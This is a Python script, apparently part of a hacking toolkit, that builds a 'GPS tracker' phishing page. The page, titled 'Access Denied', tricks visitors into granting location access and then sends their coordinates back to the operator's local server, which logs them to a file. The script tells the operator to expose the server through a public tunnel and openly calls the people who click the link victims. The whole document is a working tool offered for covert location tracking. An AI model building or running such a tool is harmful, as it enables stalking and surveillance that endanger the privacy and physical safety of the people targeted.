# CREATED BY: RAMIZ UDDIN
import os, sys, time, socketserver, http.server

def tool_header(name):
    os.system("clear")
    print("\033[1;36m" + "="*45)
    print(f"      {name.upper()}")
    print("      CREATED BY: RAMIZ UDDIN")
    print("="*45 + "\033[0m")

PORT = 8082

class GeoHandler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        
        print("\033[1;32m[*] [!] GPS LOCATION CAPTURED!\033[0m")
        print(f"\033[1;33m[*] COORDINATES: {post_data}\033[0m")
        
        with open("captured_gps.txt", "a") as f:
            f.write(f"Time: {time.ctime()} | Coordinates: {post_data}\n")
            
        self.send_response(200)
        self.end_headers()

def run():
    tool_header("GEO-LOCATOR (GPS TRACKER)")
    print("\033[1;32m[*] Advanced GPS tracking via social engineering link.")
    print("[*] Works on Root & Non-Root devices.\033[0m")
    
    # Create HTML/JS Payload
    with open("geo_index.html", "w") as f:
        f.write("""
        <html>
        <head><title>Access Denied</title></head>
        <body style="background: black; color: red; text-align: center; padding-top: 50px;">
            <h2>Please enable GPS location to access this content.</h2>
            <script>
                function track() {
                    if (navigator.geolocation) {
                        navigator.geolocation.getCurrentPosition(pos => {
                            const lat = pos.coords.latitude;
                            const lon = pos.coords.longitude;
                            const coords = 'Latitude: ' + lat + ', Longitude: ' + lon;
                            fetch('/', { method: 'POST', body: coords });
                            window.location.href = "https://google.com/maps?q=" + lat + "," + lon;
                        }, err => { window.location.href = "https://google.com"; });
                    }
                }
                track();
            </script>
        </body>
        </html>
        """)

    print("\n\033[1;33m[+] Starting Server on Port 8082...")
    print("[!] Use 'Cloud Tunnel' (Tool 101) on port 8082 to get a public link.\033[0m")
    
    handler = GeoHandler
    with socketserver.TCPServer(("", PORT), handler) as httpd:
        print("\033[1;32m[*] Waiting for victim to click the link...\033[0m")
        try:
            os.system("mv geo_index.html index.html")
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\n\033[1;31m[!] Stopping Server...\033[0m")
            os.system("rm index.html")
            httpd.shutdown()

if __name__ == "__main__": run()
